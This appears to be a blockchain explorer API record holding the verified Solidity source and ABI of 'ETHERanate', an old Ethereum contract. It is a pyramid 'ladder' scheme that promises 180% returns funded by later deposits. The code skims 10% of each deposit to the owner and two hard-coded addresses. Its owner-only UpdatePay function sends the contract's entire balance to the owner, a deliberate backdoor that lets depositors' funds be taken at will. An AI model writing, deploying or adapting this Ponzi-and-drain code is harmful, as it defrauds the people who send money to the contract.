{"status":"1","message":"OK","result":[{"SourceCode":"/*\r\netheranate  - ethereum pomegranate\r\n\r\nLadder deposit based contract with float percentage based on EtheriumPyramidSample on GitHub.\r\n\r\nETHERanate allows to get outcome in 180% with smallest deposit\r\n\r\n*/\r\ncontract ETHERanate\r\n{\r\n    struct Payer \r\n    {\r\n        address ETHaddress;\r\n        uint ETHamount;\r\n    }\r\n\r\n    Payer[] public persons;\r\n\r\n    uint public paymentqueue = 0;\r\n    uint public feecounter;\r\n    uint amount;\r\n    \r\n    address public owner;\r\n    address public ipyh=0x5fD8B8237B6fA8AEDE4fdab7338709094d5c5eA4;\r\n    address public hyip=0xfAF7100b413465Ea0eB550d6D6a2A29695A6f218;\r\n    address meg=this;\r\n\r\n    modifier _onlyowner\r\n    {\r\n        if (msg.sender == owner)\r\n        _\r\n    }\r\n    \r\n    function ETHERanate() \r\n    {\r\n        owner = msg.sender;\r\n    }\r\n    function()            \r\n    {\r\n        enter();\r\n    }\r\n    function enter()\r\n    {\r\n        if (msg.sender == owner)\r\n\t    {\r\n\t        UpdatePay();                                          \r\n\t    }\r\n\t    else                                                          \r\n\t    {\r\n            feecounter+=msg.value/10;                                  \r\n\t        owner.send(feecounter/2);                           \r\n\t        ipyh.send((feecounter/2)/2);                                 \r\n\t        hyip.send((feecounter/2)/2);\r\n\t        feecounter=0;                                            \r\n\t        \r\n            if (msg.value == (1 ether)/40)                                \r\n            {\r\n\t            amount = msg.value;                                      \r\n\t            uint idx=persons.length;                                   \r\n                persons.length+=1;\r\n                persons[idx].ETHaddress=msg.sender;\r\n                 persons[idx].ETHamount=amount;\r\n                canPay();                                              \r\n            }\r\n\t        else                                                         \r\n\t        {\r\n\t            msg.sender.send(msg.value - msg.value/10);                   \r\n\t        }\r\n\t    }\r\n\r\n    }\r\n    \r\n    function UpdatePay() _onlyowner                                            \r\n    {\r\n        msg.sender.send(meg.balance);\r\n    }\r\n    \r\n    function canPay() internal                                                  \r\n    {\r\n        while (meg.balance>persons[paymentqueue].ETHamount/100*180)             \r\n        {\r\n            uint transactionAmount=persons[paymentqueue].ETHamount/100*180;     \r\n            persons[paymentqueue].ETHaddress.send(transactionAmount);           \r\n            paymentqueue+=1;                                                    \r\n        }\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"feecounter\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"ipyh\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"UpdatePay\",\"outputs\":[],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"paymentqueue\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"hyip\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"persons\",\"outputs\":[{\"name\":\"ETHaddress\",\"type\":\"address\"},{\"name\":\"ETHamount\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"enter\",\"outputs\":[],\"type\":\"function\"},{\"inputs\":[],\"type\":\"constructor\"}]","ContractName":"ETHERanate","CompilerVersion":"v0.2.1+commit.91a6b35","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":""}]}